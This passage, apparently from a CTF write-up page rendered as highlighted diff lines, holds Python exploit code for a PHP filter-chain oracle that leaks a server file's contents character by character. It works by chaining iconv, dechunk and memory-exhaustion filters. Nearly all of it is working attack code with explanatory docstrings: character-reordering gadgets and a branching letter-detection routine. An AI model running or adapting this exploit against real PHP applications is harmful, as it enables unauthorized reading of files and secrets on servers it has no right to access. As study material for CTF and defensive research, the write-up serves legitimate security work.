+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">characters of the string. There&#39;s only one problem: our r4 gadget requires that the string length
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">turns out, if we apply the filter
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">It will turn the == into:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+---AD0-3D3D+---AD0-3D3D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And this is magic, because this corrects such that when we apply the
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Let&#39;s recap. We have a string like:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">abcdefghij==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">abcdefghij+---AD0-3D3D+---AD0-3D3D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Apply convert.iconv.CSUNICODE.CSUNICODE:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Apply r4 gadget:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Apply base64-decode | base64-encode, so the &#39;-&#39; and high bytes will disappear:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">bafedcjihg+0DAD3D3+0DAD3Dw==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Then apply r4 once more:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">efabijcd0+gh3DAD0+3D3DAD==wD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And here&#39;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">the string still has two equals signs in it, so we can reapply the technique as many times as we
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">want, to access all the characters in the string ;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&#34;</span>
+</span></span><span style="display:flex;"><span>r2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;convert.iconv.CSUNICODE.UCS-2BE&#34;</span>
+</span></span><span style="display:flex;"><span>r4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;convert.iconv.UCS-4LE.10646-1:1993&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_nth</span>(n):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> flip, r2, r4
+</span></span><span style="display:flex;"><span>	o <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>	chunk <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> chunk <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>: o<span style="color:#f92672">.</span>append(r4)
+</span></span><span style="display:flex;"><span>	o<span style="color:#f92672">.</span>extend([flip, r4] <span style="color:#f92672">*</span> (chunk <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (n <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> (chunk <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>): o<span style="color:#f92672">.</span>append(r2)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> join(<span style="color:#f92672">*</span>o)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Step 3:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">char is 0-9A-Fa-f. So it&#39;s just a matter of finding filters which translate to or from those
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">I just bruteforced every combination of iconv filters to find these.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Numbers are a bit trickier because iconv doesn&#39;t tend to touch them.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">want a full leak you can base64 encode a third time and use the first two letters of the resulting
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">string to figure out which number it is.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rot1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;convert.iconv.437.CP930&#39;</span>
+</span></span><span style="display:flex;"><span>be <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#39;</span>
+</span></span><span style="display:flex;"><span>o <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_letter</span>(prefix):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># a-f A-F 0-9</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># a-e</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|&#39;</span><span style="color:#f92672">*</span>(n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;edcba&#39;</span>[n]
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># A-E</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|&#39;</span><span style="color:#f92672">*</span>(n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;EDCBA&#39;</span>[n]
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.iconv.CSISO5427CYRILLIC.855|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># f</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;f&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># F</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;F&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># n-s N-S</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># n-r</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|&#39;</span><span style="color:#f92672">*</span>(n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;rqpon&#39;</span>[n]
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|string.tolower|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># N-R</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|string.tolower|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|&#39;</span><span style="color:#f92672">*</span>(n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;RQPON&#39;</span>[n]
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>				err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># s</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;s&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e"># S</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;S&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># i j k</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;k&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;j&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;i&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># I J K</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;K&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;J&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.tolower|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;I&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			err(<span style="color:#e6db74">&#39;something wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># v w x</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> req(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|string.rot13|</span><span style="color:#e6db74">{</span>be<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>rot1<span style="color:#e6db74">}</span><span style="color:#e6db74">|dechunk|</span><span style="color:#e6db74">{</span>blow_up_inf<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;x&#39;</span>
